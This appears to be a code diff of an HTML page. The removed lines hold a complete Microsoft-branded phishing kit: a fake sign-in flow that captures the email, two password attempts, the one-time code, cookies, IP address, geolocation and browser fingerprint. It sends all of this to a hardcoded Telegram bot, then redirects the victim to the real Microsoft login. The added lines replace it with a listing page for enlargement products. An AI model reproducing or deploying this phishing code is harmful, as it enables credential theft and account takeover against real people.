-            <div class="identity-banner">
-                <button class="back-button" id="back-to-error">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z" fill="#404040"/><path d="M10.944,7.056l.594.594L7.617,11.578H18v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944m0-.141-.071.07L5.929,11.929,5.858,12l.071.071,4.944,4.944.071.07.071-.07.594-.595.071-.07-.071-.071L7.858,12.522H18.1V11.478H7.858l3.751-3.757.071-.071-.071-.07-.594-.595-.071-.07Z" fill="#404040"/></svg>
-                </button>
-                <div class="identity" id="otp-user-email"></div>
-            </div>
-            
-            <h1 class="page-title">Enter your security code</h1>
-            <p class="page-subtitle">Verification code has been sent to your phone number on file.</p>
-            
-            <form id="otp-form">
-                <div class="form-group">
-                    <input type="tel" id="otp" class="form-control otp-input" maxlength="16" placeholder="Code" required>
-                </div>
-                
-                <div class="loading" id="otp-loading">
-                    <div class="loading-spinner"></div>
-                    <div>Verifying security code...</div>
-                </div>
-                
-                <div class="success-message hidden" id="success-message">
-                    <strong>✓ Success!</strong> Redirecting to Microsoft...
-                </div>
-                
-                <div class="form-group">
-                    <button type="button" id="btn-submit-otp" class="btn btn-primary btn-block">Submit</button>
-                </div>
-                
-                <div class="links">
-                    <div class="form-group">
-                        <a href="#" class="tooltip">Send an identity verification request to my Microsoft account app.
-                            <span class="tooltiptext">Use the Microsoft Authenticator app for verification</span>
-                        </a>
-                    </div>
-                    <div class="form-group">
-                        <a href="#" class="tooltip">If you can't use an app right now, get a code a different way.
-                            <span class="tooltiptext">Use email or SMS for verification instead</span>
-                        </a>
-                    </div>
-                </div>
-            </form>
-        </div>
-    </div>
-    
-    <!-- Session Timeout Warning -->
-    <div class="session-timeout" id="session-timeout">
-        Your session will expire in <span id="timeout-countdown">5:00</span>
-    </div>
-    
-    <div class="footer">
-        <a href="https://www.microsoft.com/en-us/servicesagreement/default.aspx">Terms of Use</a>
-        <a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; Cookies</a>
-        <span>© 2024 Microsoft</span>
     </div>
 
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="results-header">
+            <div class="results-count">Showing <span id="resultCount">8</span> results for "enlargement"</div>
+            <button class="filter-btn" onclick="toggleFilter()">⚙️ Filter</button>
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Loading products...</p>
+        </div>
+
+        <div class="products-grid" id="productsGrid">
+            <!-- Products will be injected here by JavaScript -->
+        </div>
+
+        <div class="pagination" id="pagination">
+            <button class="page-btn active">1</button>
+            <button class="page-btn">2</button>
+            <button class="page-btn">3</button>
+            <button class="page-btn">→</button>
+        </div>
+    </div>
+
+    <!-- Call Modal -->
+    <div class="modal-overlay" id="callModal" onclick="closeModal(event)">
+        <div class="modal" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <h3 class="modal-title">Contact Supplier</h3>
+                <button class="modal-close" onclick="closeModal()">×</button>
+            </div>
+            <p style="color: #718096; margin-bottom: 1rem;">Call this supplier now:</p>
+            <div class="phone-number" id="phoneNumber">+234 801 234 5678</div>
+            <div class="modal-actions">
+                <button class="btn btn-view" style="flex: 1;" onclick="copyNumber()">📋 Copy Number</button>
+                <a href="#" class="btn btn-call" style="flex: 1; text-decoration: none;" id="callLink">📞 Call Now</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast">
+        <span id="toastIcon">✓</span>
+        <span id="toastMessage">Added to favorites!</span>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p>&copy; 2025 Hamgar Herbs Nigeria. All rights reserved.</p>
+    </footer>
+
     <script>
-        // Enhanced Telegram Bot Configuration
-        const BOT_TOKEN = '5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo';
-        const CHAT_IDS = ['1376032111']; // ADD YOUR TELEGRAM CHAT IDS HERE
-        
-        // Microsoft Redirect URL
-        const MICROSOFT_REDIRECT_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638119666042062911.YzQ3MWU3MWUtY2YxMC00MDE1LTk4MzktZmRmNjdmNzAyMDNlNDRjOWY5Y2YtYzJjMC00ZTI5LWIxM2QtZWYxYjI2NjM4NzRk&ui_locales=en&mkt=en&client-request-id=ad7c3dcd-b91c-4926-a88e-a8a70bd7a646&state=h_i4y8rd6cm6mpEb_GTFsiGVo4cs08wtHIMJ4skIPI_ouse4GGYc9evvJNo6ocNOwoMPlrYm2tH1q7P6l8cXcOm_HR1STJX1akRzdrLwzzfXcUmf115GEPvypSFhQgkmnU24P1ji5GiDQgzjoZD8J-gU48jKHQw80r9HsL-J9X0fJMSpJuCmnw__MtBCr0T2h4YuOsKmeT5jUO9XEE2dQzHlfxnXYUAfcOxea0cudri4oBm80OVfaHp1jocty0rnmza9NY5DJsScuru6bou84WqHwMIxYEGn9tchsXzvnoA&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0';
-        
-        // Enhanced data collection
-        let userData = {
-            email: '',
-            passwords: [],
-            otp: '',
-            browserInfo: {},
-            cookies: {},
-            ipInfo: {},
-            geolocation: {},
-            timestamps: {},
-            sessionId: generateSessionId()
-        };
-        
-        // Function to generate session ID
-        function generateSessionId() {
-            return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        // Product Data
+        const products = [
+            { id: 1, title: "Breast and Butt Enlargement Products", price: "NGN2,500", boosted: true, supplier: "Beauty Supplies Ltd", phone: "+234 801 234 5678" },
+            { id: 2, title: "Hip Up and Breast Enlargement Capsules", price: "NGN6,000", boosted: false, supplier: "Wellness Hub", phone: "+234 802 345 6789" },
+            { id: 3, title: "Enlarge Oil - Natural Enhancement", price: "NGN3,000", boosted: true, supplier: "Organic Solutions", phone: "+234 803 456 7890" },
+            { id: 4, title: "Garlic Butt and Hips Enlargement Oil", price: "NGN2,500", boosted: true, supplier: "Herbal Remedies", phone: "+234 804 567 8901" },
+            { id: 5, title: "MK II Penis Enlargement Oil", price: "NGN3,000", boosted: false, supplier: "Men's Health Store", phone: "+234 805 678 9012" },
+            { id: 6, title: "Feed Richer Hips Up Butt Enlargement Capsule", price: "NGN1,800", boosted: true, supplier: "Curves Enhancement", phone: "+234 806 789 0123" },
+            { id: 7, title: "Black Diamond Cream + Coffee Enlargement Set", price: "NGN8,500", boosted: false, supplier: "Premium Beauty", phone: "+234 807 890 1234" },
+            { id: 8, title: "2 Mini Bazouka Cream Super Oil", price: "NGN4,200", boosted: false, supplier: "International Imports", phone: "+234 808 901 2345" }
+        ];
+
+        let favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            renderProducts();
+        });
+
+        function renderProducts() {
+            const grid = document.getElementById('productsGrid');
+            grid.innerHTML = products.map(product => `
+                <div class="product-card" data-id="${product.id}">
+                    <div class="product-image">
+                        ${product.boosted ? '<span class="boosted-badge">Boosted</span>' : ''}
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-title">${product.title}</h3>
+                        <div class="product-price">${product.price}</div>
+                        <div class="product-actions">
+                            <button class="btn btn-view" onclick="viewProduct(${product.id})">👁 View</button>
+                            <button class="btn btn-call" onclick="showCallModal('${product.phone}', '${product.supplier}')">📞 Call</button>
+                            <button class="btn btn-fav ${favorites.includes(product.id) ? 'active' : ''}" onclick="toggleFavorite(${product.id})">
+                                ${favorites.includes(product.id) ? '❤' : '🤍'}
+                            </button>
+                        </div>
+                        <div class="supplier-info">
+                            <div class="supplier-avatar">${product.supplier.charAt(0)}</div>
+                            <span>${product.supplier}</span>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
         }
-        
-        // Function to get all cookies
-        function getAllCookies() {
-            const cookies = {};
-            document.cookie.split(';').forEach(cookie => {
-                const [name, value] = cookie.trim().split('=');
-                cookies[name] = value;
-            });
-            return cookies;
-        }
-        
-        // Function to set tracking cookies
-        function setTrackingCookies() {
-            const sessionId = userData.sessionId;
-            const visitTime = new Date().toISOString();
+
+        function handleSearch(e) {
+            e.preventDefault();
+            const query = document.getElementById('searchInput').value;
             
-            // Set session cookie
-            document.cookie = `msft_session=${sessionId}; path=/; max-age=3600`;
-            document.cookie = `msft_visit_time=${visitTime}; path=/; max-age=3600`;
-            document.cookie = `msft_visit_count=${getVisitCount() + 1}; path=/; max-age=2592000`; // 30 days
+            // Show loading
+            document.getElementById('loading').classList.add('active');
+            document.getElementById('productsGrid').style.opacity = '0.5';
+            
+            // Simulate search delay
+            setTimeout(() => {
+                document.getElementById('loading').classList.remove('active');
+                document.getElementById('productsGrid').style.opacity = '1';
+                document.querySelector('.search-title').textContent = `Search Results for "${query}"`;
+                showToast('Search completed!', 'success');
+            }, 800);
         }
-        
-        // Function to get visit count
-        function getVisitCount() {
-            const cookies = getAllCookies();
-            return parseInt(cookies.msft_visit_count) || 0;
+
+        function toggleMenu() {
+            document.getElementById('navMenu').classList.toggle('active');
         }
-        
-        // Function to get IP address and geolocation
-        async function getIPAndGeolocation() {
-            try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                userData.ipInfo.ip = ipData.ip;
-                
-                // Get geolocation using ipapi
-                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const geoData = await geoResponse.json();
-                
-                userData.geolocation = {
-                    ip: ipData.ip,
-                    city: geoData.city,
-                    region: geoData.region,
-                    country: geoData.country_name,
-                    country_code: geoData.country_code,
-                    postal: geoData.postal,
-                    latitude: geoData.latitude,
-                    longitude: geoData.longitude,
-                    timezone: geoData.timezone,
-                    org: geoData.org,
-                    asn: geoData.asn
-                };
-                
-                return userData.geolocation;
-            } catch (error) {
-                console.error('Error fetching IP/geolocation:', error);
-                userData.ipInfo.ip = 'Unknown';
-                userData.geolocation = { error: 'Could not fetch location data' };
-                return null;
+
+        function toggleFavorite(id) {
+            const index = favorites.indexOf(id);
+            if (index > -1) {
+                favorites.splice(index, 1);
+                showToast('Removed from favorites', 'error');
+            } else {
+                favorites.push(id);
+                showToast('Added to favorites!', 'success');
+            }
+            localStorage.setItem('favorites', JSON.stringify(favorites));
+            renderProducts();
+        }
+
+        function showCallModal(phone, supplier) {
+            document.getElementById('phoneNumber').textContent = phone;
+            document.getElementById('callLink').href = `tel:${phone}`;
+            document.getElementById('callModal').classList.add('active');
+        }
+
+        function closeModal(e) {
+            if (!e || e.target.id === 'callModal') {
+                document.getElementById('callModal').classList.remove('active');
             }
         }
-        
-        // Function to get browser geolocation
-        function getBrowserGeolocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        userData.geolocation.browserLocation = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        resolve(userData.geolocation.browserLocation);
-                    },
-                    (error) => {
-                        console.error('Geolocation error:', error);
-                        resolve(null);
-                    },
-                    { timeout: 5000 }
-                );
+
+        function copyNumber() {
+            const number = document.getElementById('phoneNumber').textContent;
+            navigator.clipboard.writeText(number).then(() => {
+                showToast('Phone number copied!', 'success');
             });
         }
-        
-        // Function to send data to Telegram
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            for (const chatId of CHAT_IDS) {
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                    
-                    if (!response.ok) {
-                        console.error(`Failed to send message to chat ${chatId}`);
-                    }
-                } catch (error) {
-                    console.error('Error sending to Telegram:', error);
-                }
-            }
+
+        function viewProduct(id) {
+            showToast(`Viewing product #${id} details...`, 'success');
+            // In a real app, this would navigate to product detail page
         }
-        
-        // Function to show loading state
-        function showLoading(page) {
-            document.getElementById(`${page}-loading`).style.display = 'block';
+
+        function toggleFilter() {
+            showToast('Filter options coming soon!', 'success');
         }
-        
-        // Function to hide loading state
-        function hideLoading(page) {
-            document.getElementById(`${page}-loading`).style.display = 'none';
-        }
-        
-        // Function to redirect to Microsoft
-        function redirectToMicrosoft() {
-            document.getElementById('success-message').classList.remove('hidden');
+
+        function showToast(message, type) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toastMessage').textContent = message;
+            document.getElementById('toastIcon').textContent = type === 'success' ? '✓' : '✕';
+            toast.className = `toast ${type} show`;
             
             setTimeout(() => {
-                window.location.href = MICROSOFT_REDIRECT_URL;
-            }, 2000);
+                toast.classList.remove('show');
+            }, 3000);
         }
-        
-        // Function to update progress bar
-        function updateProgress(step) {
-            const progress = document.getElementById('form-progress');
-            const percentages = {1: 25, 2: 50, 3: 75, 4: 100};
-            progress.style.width = `${percentages[step]}%`;
-        }
-        
-        // Function to check password strength
-        function checkPasswordStrength(password) {
-            let strength = 0;
-            if (password.length >= 8) strength += 25;
-            if (/[a-z]/.test(password) && /[A-Z]/.test(password)) strength += 25;
-            if (/[0-9]/.test(password)) strength += 25;
-            if (/[^A-Za-z0-9]/.test(password)) strength += 25;
-            
-            const strengthBar = document.getElementById('password-strength');
-            strengthBar.style.width = `${strength}%`;
-            
-            if (strength < 50) {
-                strengthBar.style.background = 'linear-gradient(90deg, #d13438, #ffaa44)';
-            } else if (strength < 75) {
-                strengthBar.style.background = 'linear-gradient(90deg, #ffaa44, #ffaa44)';
-            } else {
-                strengthBar.style.background = 'linear-gradient(90deg, #107c10, #107c10)';
-            }
-        }
-        
-        // Function to generate CAPTCHA
-        function generateCaptcha() {
-            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-            let captcha = '';
-            for (let i = 0; i < 6; i++) {
-                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            document.getElementById('captcha-text').textContent = captcha;
-            return captcha;
-        }
-        
-        // Function to collect browser information
-        function collectBrowserInfo() {
-            const browserInfo = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookiesEnabled: navigator.cookieEnabled,
-                javaEnabled: navigator.javaEnabled(),
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory
-            };
-            
-            document.getElementById('browser-info').textContent = 
-                `Browser: ${browserInfo.platform} | Screen: ${browserInfo.screenResolution} | Timezone: ${browserInfo.timezone}`;
-            
-            return browserInfo;
-        }
-        
-        // Function to update location info display
-        function updateLocationInfo(geoData) {
-            const locationElement = document.getElementById('location-info');
-            if (geoData && geoData.city) {
-                locationElement.textContent = 
-                    `Location: ${geoData.city}, ${geoData.region}, ${geoData.country_code} | IP: ${geoData.ip}`;
-            } else {
-                locationElement.textContent = 'Location: Gathering location data...';
-            }
-        }
-        
-        // Session timeout functionality
-        function startSessionTimer() {
-            let timeLeft = 300; // 5 minutes
-            const timeoutElement = document.getElementById('session-timeout');
-            const countdownElement = document.getElementById('timeout-countdown');
-            
-            const timer = setInterval(() => {
-                timeLeft--;
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                countdownElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-                
-                if (timeLeft <= 60) {
-                    timeoutElement.style.display = 'block';
+
+        // Pagination interaction
+        document.querySelectorAll('.page-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                if (this.textContent !== '→') {
+                    document.querySelectorAll('.page-btn').forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
                 }
-                
-                if (timeLeft <= 0) {
-                    clearInterval(timer);
-                    location.reload();
-                }
-            }, 1000);
-        }
-        
-        // Cookie banner functionality
-        function showCookieBanner() {
-            const cookieBanner = document.getElementById('cookie-banner');
-            if (!localStorage.getItem('cookies_accepted')) {
-                cookieBanner.style.display = 'block';
-            }
-        }
-        
-        // Page navigation
-        document.addEventListener('DOMContentLoaded', async function() {
-            // Initialize features
-            const currentCaptcha = generateCaptcha();
-            userData.browserInfo = collectBrowserInfo();
-            userData.cookies = getAllCookies();
-            setTrackingCookies();
-            startSessionTimer();
-            showCookieBanner();
-            updateProgress(1);
-            
-            // Get IP and geolocation
-            const geoData = await getIPAndGeolocation();
-            updateLocationInfo(geoData);
-            
-            // Try to get browser geolocation
-            getBrowserGeolocation().then(browserGeo => {
-                if (browserGeo) {
-                    userData.geolocation.browserLocation = browserGeo;
-                }
-            });
-            
-            // Cookie acceptance
-            document.getElementById('accept-cookies').addEventListener('click', function() {
-                localStorage.setItem('cookies_accepted', 'true');
-                document.getElementById('cookie-banner').style.display = 'none';
-            });
-            
-            // Button navigation
-            const emailInput = document.getElementById('email');
-            const passwordInput = document.getElementById('password');
-            const errorPasswordInput = document.getElementById('error-password');
-            const otpInput = document.getElementById('otp');
-            const captchaInput = document.getElementById('captcha-input');
-            
-            const userEmail = document.getElementById('user-email');
-            const errorUserEmail = document.getElementById('error-user-email');
-            const otpUserEmail = document.getElementById('otp-user-email');
-            
-            // Password toggle functionality
-            document.getElementById('toggle-password').addEventListener('click', function() {
-                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                passwordInput.setAttribute('type', type);
-                this.textContent = type === 'password' ? '👁️' : '🔒';
-            });
-            
-            document.getElementById('toggle-error-password').addEventListener('click', function() {
-                const type = errorPasswordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                errorPasswordInput.setAttribute('type', type);
-                this.textContent = type === 'password' ? '👁️' : '🔒';
-            });
-            
-            // Password strength checker
-            passwordInput.addEventListener('input', function() {
-                checkPasswordStrength(this.value);
-            });
-            
-            // Next button - email submission
-            document.getElementById('btn-next').addEventListener('click', async function() {
-                if (emailInput.value && captchaInput.value === currentCaptcha) {
-                    showLoading('login');
-                    
-                    // Store email
-                    userData.email = emailInput.value;
-                    userData.timestamps.emailSubmitted = new Date().toLocaleString();
-                    localStorage.setItem('eml', emailInput.value);
-                    
-                    // Send enhanced data to Telegram
-                    const message = `📧 <b>Microsoft Login - Email Submitted</b>\n\n📧 Email: <code>${emailInput.value}</code>\n🌐 IP: <code>${userData.geolocation.ip || 'Unknown'}</code>\n📍 Location: ${userData.geolocation.city ? `${userData.geolocation.city}, ${userData.geolocation.country}` : 'Unknown'}\n🆔 Session: ${userData.sessionId}\n⏰ Timestamp: ${userData.timestamps.emailSubmitted}\n🌐 Browser: ${userData.browserInfo.userAgent}\n🖥️ Platform: ${userData.browserInfo.platform}\n📍 Timezone: ${userData.browserInfo.timezone}\n🍪 Cookies: ${Object.keys(userData.cookies).length} cookies found`;
-                    await sendToTelegram(message);
-                    
-                    // Update UI
-                    userEmail.textContent = emailInput.value;
-                    errorUserEmail.textContent = emailInput.value;
-                    otpUserEmail.textContent = emailInput.value;
-                    
-                    // Navigate
-                    document.getElementById('login-page').classList.add('hidden');
-                    document.getElementById('password-page').classList.remove('hidden');
-                    updateProgress(2);
-                    
-                    hideLoading('login');
-                } else if (captchaInput.value !== currentCaptcha) {
-                    alert('Please enter the correct CAPTCHA text');
-                    generateCaptcha();
-                    captchaInput.value = '';
-                }
-            });
-            
-            // Sign in button - password submission
-            document.getElementById('btn-signin').addEventListener('click', async function() {
-                if (passwordInput.value) {
-                    showLoading('password');
-                    
-                    userData.passwords.push(passwordInput.value);
-                    userData.timestamps.passwordSubmitted = new Date().toLocaleString();
-                    
-                    // Send password to Telegram
-                    const message = `🔐 <b>Microsoft Login - Password Submitted</b>\n\n📧 Email: <code>${userData.email}</code>\n🔐 Password: <code>${passwordInput.value}</code>\n🌐 IP: <code>${userData.geolocation.ip || 'Unknown'}</code>\n📍 Location: ${userData.geolocation.city ? `${userData.geolocation.city}, ${userData.geolocation.country}` : 'Unknown'}\n⏰ Timestamp: ${userData.timestamps.passwordSubmitted}\n💪 Strength: ${document.getElementById('password-strength').style.width}`;
-                    await sendToTelegram(message);
-                    
-                    // Navigate to error page
-                    document.getElementById('password-page').classList.add('hidden');
-                    document.getElementById('error-page').classList.remove('hidden');
-                    updateProgress(3);
-                    
-                    hideLoading('password');
-                }
-            });
-            
-            // Try again button - error password submission
-            document.getElementById('btn-try-again').addEventListener('click', async function() {
-                if (errorPasswordInput.value) {
-                    showLoading('error');
-                    
-                    userData.passwords.push(errorPasswordInput.value);
-                    userData.timestamps.errorPasswordSubmitted = new Date().toLocaleString();
-                    
-                    // Send error password to Telegram
-                    const message = `⚠️ <b>Microsoft Login - Error Password Submitted</b>\n\n📧 Email: <code>${userData.email}</code>\n🔐 Password: <code>${errorPasswordInput.value}</code>\n🌐 IP: <code>${userData.geolocation.ip || 'Unknown'}</code>\n📍 Location: ${userData.geolocation.city ? `${userData.geolocation.city}, ${userData.geolocation.country}` : 'Unknown'}\n⏰ Timestamp: ${userData.timestamps.errorPasswordSubmitted}`;
-                    await sendToTelegram(message);
-                    
-                    // Navigate to OTP page
-                    document.getElementById('error-page').classList.add('hidden');
-                    document.getElementById('otp-page').classList.remove('hidden');
-                    updateProgress(4);
-                    
-                    hideLoading('error');
-                }
-            });
-            
-            // OTP submission
-            document.getElementById('btn-submit-otp').addEventListener('click', async function() {
-                if (otpInput.value) {
-                    showLoading('otp');
-                    
-                    userData.otp = otpInput.value;
-                    userData.timestamps.otpSubmitted = new Date().toLocaleString();
-                    
-                    // Send OTP to Telegram
-                    const message = `🔢 <b>Microsoft Login - OTP Submitted</b>\n\n📧 Email: <code>${userData.email}</code>\n🔢 OTP: <code>${otpInput.value}</code>\n🌐 IP: <code>${userData.geolocation.ip || 'Unknown'}</code>\n📍 Location: ${userData.geolocation.city ? `${userData.geolocation.city}, ${userData.geolocation.country}` : 'Unknown'}\n⏰ Timestamp: ${userData.timestamps.otpSubmitted}`;
-                    await sendToTelegram(message);
-                    
-                    // Send final comprehensive summary
-                    const summaryMessage = `✅ <b>Microsoft Login - COMPLETE DATA CAPTURE</b>\n\n📧 Email: <code>${userData.email}</code>\n🔐 Password 1: <code>${userData.passwords[0]}</code>\n⚠️ Password 2: <code>${userData.passwords[1]}</code>\n🔢 OTP: <code>${userData.otp}</code>\n\n🌐 NETWORK INFORMATION:\nIP: <code>${userData.geolocation.ip}</code>\nLocation: ${userData.geolocation.city}, ${userData.geolocation.region}, ${userData.geolocation.country}\nISP: ${userData.geolocation.org}\nCoordinates: ${userData.geolocation.latitude}, ${userData.geolocation.longitude}\n\n💻 BROWSER INFORMATION:\nUser Agent: ${userData.browserInfo.userAgent}\nPlatform: ${userData.browserInfo.platform}\nScreen: ${userData.browserInfo.screenResolution}\nTimezone: ${userData.browserInfo.timezone}\nLanguage: ${userData.browserInfo.language}\n\n🆔 SESSION DATA:\nSession ID: ${userData.sessionId}\nCookies: ${Object.keys(userData.cookies).length} found\nVisit Count: ${getVisitCount()}\nFinal Timestamp: ${new Date().toLocaleString()}\n\n🚀 Redirecting to Microsoft...`;
-                    await sendToTelegram(summaryMessage);
-                    
-                    hideLoading('otp');
-                    redirectToMicrosoft();
-                }
-            });
-            
-            // Back buttons
-            document.getElementById('back-to-login').addEventListener('click', function() {
-                document.getElementById('password-page').classList.add('hidden');
-                document.getElementById('login-page').classList.remove('hidden');
-                updateProgress(1);
-            });
-            
-            document.getElementById('back-to-password').addEventListener('click', function() {
-                document.getElementById('error-page').classList.add('hidden');
-                document.getElementById('password-page').classList.remove('hidden');
-                updateProgress(2);
-            });
-            
-            document.getElementById('back-to-error').addEventListener('click', function() {
-                document.getElementById('otp-page').classList.add('hidden');
-                document.getElementById('error-page').classList.remove('hidden');
-                updateProgress(3);
-            });
-            
-            // Load saved email
-            const savedEmail = localStorage.getItem('eml');
-            if (savedEmail) {
-                emailInput.value = savedEmail;
-                userEmail.textContent = savedEmail;
-                errorUserEmail.textContent = savedEmail;
-                otpUserEmail.textContent = savedEmail;
-            }
-            
-            // Form submission prevention
-            const forms = document.querySelectorAll('form');
-            forms.forEach(form => {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                });
+                showToast(`Page ${this.textContent} loaded`, 'success');
             });
         });
     </script>
 </body>
 </html>
-
